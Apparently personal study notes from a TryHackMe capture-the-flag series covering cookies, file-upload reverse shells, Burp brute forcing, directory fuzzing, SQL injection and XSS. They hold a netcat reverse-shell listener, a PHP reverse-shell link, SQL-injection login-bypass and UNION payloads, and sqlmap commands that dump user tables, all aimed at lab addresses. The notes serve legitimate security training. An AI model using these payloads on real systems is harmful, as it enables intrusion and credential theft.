DAY 1: COOKIES

	ADDITIONAL ROOMS:
		https://tryhackme.com/room/webfundamentals
	

DAY 2: URLs (GET VULNs)

	TOOLS:
		https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
	
	COMMANDS:
		gobuster (optional) -- find directory of uploaded content: 
			gobuster dir -u http://10.10.137.19 -w ~/infosec/wordlists/test.txt --wildcard
			
		netcat -- listen for reverse shell to phone home:
			sudo nc -lvnp 443
				NOTE: edit shell script prior to uploading
	
	ADDITIONAL ROOMS:
		https://tryhackme.com/room/uploadvulns
		https://tryhackme.com/room/introtoshells
	

DAY 3: BURPS

	Burp Proxy >> Intruder to brute force credentials from list

	TOOLS:
		https://portswigger.net/burp/communitydownload
		
	ADDITIONAL ROOMS:
	
	ADDITIONAL RESOURCES:
		https://github.com/danielmiessler/SecLists/
	
	READING:
		https://hackerone.com/reports/195163
		https://hackerone.com/reports/804548
		https://www.bleepingcomputer.com/news/security/15-percent-of-all-iot-device-owners-dont-change-default-passwords/
	
	
DAY 4: FUZZ	
	
	TOOLS:
		https://github.com/OJ/gobuster 
			(gvm needed for Go environment on WSL Ubuntu)
				https://github.com/moovweb/gvm
				gvm install go1.4 -B
				gvm use go1.4
				export GOROOT_BOOTSTRAP=$GOROOT
				gvm install go1.15.6
				gvm use go1.15.6 [--default]
		
		https://github.com/xmendez/wfuzz
			PREREQ:
				apt install libcurl4-openssl-dev libssl-dev
			THEN:
				python3 -m pip install wfuzz 
				export PATH=$PATH:/home/rem/.local/bin
		
	COMMANDS:
		gobuster:
			-u  	// specify URL
			-w  	// specify wordlist
			-x  	// specify file extensions
			
			gobuster dir -u http://10.10.60.156/ -w ~/infosec/wordlists/test.txt
		
		wfuzz:
			-c  	// colorized output
			-d  	// set parameters to fuzz (data is encoded for HTML)
			-z  	// fuzz database (e.g. -z file,big.txt)
			--hc	// ignore less than helpful http response codes (404, 200, etc)
			--hl	// don't show for a certian amount of lines??
			--hh	// don't show for a certain amount of characters??
			
			wfuzz -c -z file,wordlist.txt -d "date=FUZZ" -u http://10.10.60.156/api/site-log.php
	
	ADDITIONAL ROOMS:
		https://tryhackme.com/room/zthweb2
		https://tryhackme.com/room/ccpentesting
	
	ADDITIONAL RESOURCES:
		http://manpages.ubuntu.com/manpages/cosmic/man1/gobuster.1.html
		https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/big.txt
		


DAY 5: SQLi

	TOOLS:
		git clone --depth 1 <https://github.com/sqlmapproject/sqlmap.git> sqlmap-dev
	
	COMMANDS:
		SQLi:
			' or true -- 					// worked with blank username
			anything') or true -- 			// didn't work (only used in example site)
			' UNION SELECT username, password FROM users -- // didn't need to try
		
		SQLMap
			Get tables:
				./sqlmap.py -r ~/infosec/junk/finalsql --tamper=space2comment -p search --dbms sqlite --tables
			
			Get flag:
				./sqlmap.py -r ~/infosec/junk/finalsql --tamper=space2comment -p search --dbms sqlite -T hidden_table --dump

			Get password:
				./sqlmap.py -r ~/infosec/junk/finalsql --tamper=space2comment -p search --dbms sqlite -T users --dump		
	
	ADDITIONAL ROOMS:
		https://tryhackme.com/room/sqlibasics
	
	ADDITIONAL RESOURCES:
		https://www.codecademy.com/articles/sql-commands
		https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet
		https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
		https://github.com/payloadbox/sql-injection-payload-list
		https://alpinesecurity.com/blog/sqlmap-sucking-your-whole-database-through-a-tiny-little-straw/
			^^^
	

DAY 6: XSS

	Types of XSS attacks:
		Stored: content that persistently exists on the website and can be viewed by victims
			User posts, comments, images, etc
		Reflected: carried out directly in the HTTP request (and requires the attacker to do a bit more work)
			Links

	TOOLS:
		https://www.zaproxy.org/
		
	ADDITIONAL ROOMS: 
		https://tryhackme.com/room/learnowaspzap

	ADDITIONAL RESOURCES:
		https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md
		https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
		https://github.com/payloadbox/xss-payload-list
